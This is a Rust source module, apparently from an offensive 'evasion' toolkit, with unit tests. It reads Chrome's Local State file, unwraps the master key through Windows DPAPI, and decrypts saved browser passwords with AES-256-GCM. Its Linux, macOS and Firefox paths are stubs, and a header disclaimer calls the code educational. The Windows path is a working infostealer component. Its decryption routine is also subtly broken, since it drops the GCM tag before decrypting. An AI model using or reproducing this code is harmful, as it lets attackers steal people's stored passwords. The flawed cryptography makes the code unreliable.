//! Master Key Extraction Module
//!
//! Provides extraction of encryption keys for browser password decryption:
//! - Windows DPAPI (Data Protection API)
//! - Linux libsecret/Keyring
//! - macOS Keychain
//!
//! WARNING: These techniques are used by malware to steal credentials.
//! Use only for educational/defensive research purposes.

use std::path::Path;

use crate::module::evasion::errors::EvasionError;

/// Master key extraction result
#[derive(Debug, Clone)]
pub struct MasterKey {
    /// Raw key bytes
    pub key: Vec<u8>,
    /// Key source (browser/OS)
    pub source: String,
    /// Whether key is encrypted and needs further decryption
    pub is_encrypted: bool,
}

/// DPAPI blob structure (Windows)
#[derive(Debug, Clone)]
pub struct DpapiBlob {
    /// DPAPI version
    pub version: u32,
    /// GUID markers
    pub guid: Vec<u8>,
    /// Flags
    pub flags: u32,
    /// Description length
    pub desc_len: u32,
    /// Description
    pub description: String,
    /// Encrypted data
    pub encrypted_data: Vec<u8>,
    /// HMAC signature
    pub hmac: Vec<u8>,
}

impl DpapiBlob {
    /// Parse DPAPI blob from raw bytes
    pub fn parse(data: &[u8]) -> Result<Self, EvasionError> {
        if data.len() < 28 {
            return Err(EvasionError::Internal(
                "DPAPI blob too short".to_string(),
            ));
        }

        let version = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
        if version != 1 {
            return Err(EvasionError::Internal(format!(
                "Unsupported DPAPI version: {}",
                version
            )));
        }

        let guid_len = 16;
        let guid = data[4..4 + guid_len].to_vec();

        let flags =
            u32::from_le_bytes([data[20], data[21], data[22], data[23]]);

        let desc_len =
            u32::from_le_bytes([data[24], data[25], data[26], data[27]]);

        let mut offset = 28;
        let description = if desc_len > 0 {
            let desc_bytes = &data[offset..offset + desc_len as usize];
            // UTF-16 LE decode
            String::from_utf16_lossy(
                &desc_bytes
                    .chunks_exact(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect::<Vec<_>>(),
            )
        } else {
            String::new()
        };
        offset += desc_len as usize;

        // Skip to encrypted data (simplified - real parsing is more complex)
        let encrypted_data = data[offset..].to_vec();

        Ok(Self {
            version,
            guid,
            flags,
            desc_len,
            description,
            encrypted_data,
            hmac: Vec::new(),
        })
    }
}

/// Master key extractor
pub struct MasterKeyExtractor;

impl MasterKeyExtractor {
    /// Extract master key from Chrome/Chromium Local State
    pub fn extract_chrome_master_key(
        local_state_path: &Path,
    ) -> Result<MasterKey, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::extract_chrome_master_key_windows(local_state_path)
        }

        #[cfg(target_os = "linux")]
        {
            Self::extract_chrome_master_key_linux(local_state_path)
        }

        #[cfg(target_os = "macos")]
        {
            Self::extract_chrome_master_key_macos(local_state_path)
        }

        #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
        {
            Err(EvasionError::Internal(
                "Chrome master key extraction not supported".to_string(),
            ))
        }
    }

    /// Extract Firefox master key from key4.db
    pub fn extract_firefox_master_key(
        _profile_path: &Path,
    ) -> Result<MasterKey, EvasionError> {
        // Firefox uses PKCS#11/NSS for encryption
        // Full implementation would need NSS libraries
        Err(EvasionError::Internal(
            "Firefox master key extraction requires NSS library".to_string(),
        ))
    }

    #[cfg(target_os = "windows")]
    fn extract_chrome_master_key_windows(
        local_state_path: &Path,
    ) -> Result<MasterKey, EvasionError> {
        use std::fs;

        // Read Local State JSON file
        let content = fs::read_to_string(local_state_path).map_err(|e| {
            EvasionError::FileSystem(format!(
                "Failed to read Local State: {}",
                e
            ))
        })?;

        // Parse JSON to find encrypted key
        let json: serde_json::Value = serde_json::from_str(&content).map_err(|e| {
            EvasionError::Internal(format!("Failed to parse JSON: {}", e))
        })?;

        let encrypted_key_b64 = json
            .get("os_crypt")
            .and_then(|v| v.get("encrypted_key"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                EvasionError::Internal("encrypted_key not found".to_string())
            })?;

        // Decode base64
        let encrypted_key = base64_decode(encrypted_key_b64)?;

        // DPAPI encrypted key starts with "DPAPI"
        if encrypted_key.len() < 5 || &encrypted_key[0..5] != b"DPAPI" {
            return Err(EvasionError::Internal(
                "Invalid DPAPI key format".to_string(),
            ));
        }

        // Skip DPAPI prefix
        let dpapi_blob = &encrypted_key[5..];

        // Decrypt using DPAPI
        let decrypted = Self::dpapi_unprotect(dpapi_blob)?;

        Ok(MasterKey {
            key: decrypted,
            source: "Chrome (Windows)".to_string(),
            is_encrypted: false,
        })
    }

    #[cfg(target_os = "linux")]
    fn extract_chrome_master_key_linux(
        _local_state_path: &Path,
    ) -> Result<MasterKey, EvasionError> {
        

        // On Linux, Chrome uses libsecret/GNOME Keyring
        // The Local State file doesn't contain the master key
        // Key is stored in GNOME Keyring

        // For now, return error - full implementation needs libsecret
        Err(EvasionError::Internal(
            "Linux Chrome key extraction requires libsecret".to_string(),
        ))
    }

    #[cfg(target_os = "macos")]
    fn extract_chrome_master_key_macos(
        local_state_path: &Path,
    ) -> Result<MasterKey, EvasionError> {
        // On macOS, Chrome uses Keychain
        // Full implementation needs Security framework
        Err(EvasionError::Internal(
            "macOS Chrome key extraction requires Keychain access".to_string(),
        ))
    }

    /// Decrypt DPAPI-encrypted data (Windows only)
    #[cfg(target_os = "windows")]
    fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, EvasionError> {
        use std::ptr;
        use winapi::um::dpapi::CryptUnprotectData;
        use winapi::um::winbase::CRYPTPROTECT_UI_FORBIDDEN;
        use winapi::um::winnt::DATA_BLOB;

        unsafe {
            let mut data_in = DATA_BLOB {
                cbData: data.len() as u32,
                pbData: data.as_ptr() as *mut _,
            };

            let mut data_out = DATA_BLOB {
                cbData: 0,
                pbData: ptr::null_mut(),
            };

            let result = CryptUnprotectData(
                &mut data_in,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                CRYPTPROTECT_UI_FORBIDDEN,
                &mut data_out,
            );

            if result == 0 {
                return Err(EvasionError::Internal(
                    "DPAPI decryption failed".to_string(),
                ));
            }

            let decrypted = std::slice::from_raw_parts(
                data_out.pbData,
                data_out.cbData as usize,
            )
            .to_vec();

            // Free allocated memory
            winapi::um::winbase::LocalFree(data_out.pbData as *mut _);

            Ok(decrypted)
        }
    }

    /// Decrypt password using AES-GCM (Chrome 80+)
    pub fn decrypt_chrome_password(
        encrypted_password: &[u8],
        master_key: &[u8],
    ) -> Result<String, EvasionError> {
        // Chrome 80+ uses AES-256-GCM
        // Format: "v10" + IV (12 bytes) + ciphertext + tag (16 bytes)

        if encrypted_password.len() < 15 {
            return Err(EvasionError::Internal(
                "Encrypted password too short".to_string(),
            ));
        }

        // Check version prefix
        if &encrypted_password[0..3] != b"v10" {
            return Err(EvasionError::Internal(
                "Unsupported password version".to_string(),
            ));
        }

        // Skip version prefix
        let data = &encrypted_password[3..];

        // Extract IV (12 bytes)
        let iv = &data[0..12];

        // Extract ciphertext + tag
        let ciphertext_with_tag = &data[12..];

        // Decrypt using AES-256-GCM
        Self::aes_gcm_decrypt(ciphertext_with_tag, master_key, iv)
    }

    /// AES-256-GCM decryption
    fn aes_gcm_decrypt(
        ciphertext_with_tag: &[u8],
        key: &[u8],
        iv: &[u8],
    ) -> Result<String, EvasionError> {
        if ciphertext_with_tag.len() < 16 {
            return Err(EvasionError::Internal(
                "Ciphertext too short".to_string(),
            ));
        }

        // Split ciphertext and tag
        let tag_start = ciphertext_with_tag.len() - 16;
        let ciphertext = &ciphertext_with_tag[0..tag_start];
        let _tag = &ciphertext_with_tag[tag_start..];

        // Use aes-gcm crate for decryption
        use aes_gcm::{
            aead::{Aead, KeyInit},
            Aes256Gcm, Nonce,
        };

        let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| {
            EvasionError::Internal(format!("Failed to init cipher: {}", e))
        })?;

        let nonce = Nonce::from_slice(iv);

        let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| {
            EvasionError::Internal(format!("Decryption failed: {}", e))
        })?;

        String::from_utf8(plaintext).map_err(|e| {
            EvasionError::Internal(format!(
                "Invalid UTF-8 in decrypted data: {}",
                e
            ))
        })
    }
}

/// Base64 decode helper
#[allow(dead_code)]
fn base64_decode(encoded: &str) -> Result<Vec<u8>, EvasionError> {
    use base64::{engine::general_purpose::STANDARD, Engine};
    STANDARD
        .decode(encoded)
        .map_err(|e| EvasionError::Internal(format!("Base64 decode failed: {}", e)))
}

/// Decrypt Chrome password (convenience function)
pub fn decrypt_chrome_password(
    encrypted: &[u8],
    master_key: &[u8],
) -> Result<String, EvasionError> {
    MasterKeyExtractor::decrypt_chrome_password(encrypted, master_key)
}

/// Extract Chrome master key (convenience function)
pub fn extract_chrome_master_key(
    local_state_path: &Path,
) -> Result<MasterKey, EvasionError> {
    MasterKeyExtractor::extract_chrome_master_key(local_state_path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dpapi_blob_parsing() {
        // Minimal valid DPAPI blob
        let data = vec![
            0x01, 0x00, 0x00, 0x00, // version 1
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // guid
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, // flags
            0x00, 0x00, 0x00, 0x00, // desc_len = 0
        ];

        let blob = DpapiBlob::parse(&data);
        assert!(blob.is_ok());
        let blob = blob.unwrap();
        assert_eq!(blob.version, 1);
        assert_eq!(blob.description, "");
    }

    #[test]
    fn test_dpapi_blob_too_short() {
        let data = vec![0x01, 0x00, 0x00];
        let blob = DpapiBlob::parse(&data);
        assert!(blob.is_err());
    }

    #[test]
    fn test_base64_decode() {
        let decoded = base64_decode("SGVsbG8=").unwrap();
        assert_eq!(decoded, b"Hello");
    }

    #[test]
    fn test_base64_decode_invalid() {
        let decoded = base64_decode("!!!invalid!!!");
        assert!(decoded.is_err());
    }

    #[test]
    fn test_decrypt_chrome_password_format() {
        // Test with invalid data
        let encrypted = b"v10short";
        let key = vec![0u8; 32];

        let result = decrypt_chrome_password(encrypted, &key);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_chrome_password_version() {
        // Test with wrong version prefix
        let encrypted = b"v99"
            .iter()
            .chain(std::iter::repeat(&0u8).take(30))
            .copied()
            .collect::<Vec<_>>();
        let key = vec![0u8; 32];

        let result = decrypt_chrome_password(&encrypted, &key);
        assert!(result.is_err());
    }
}
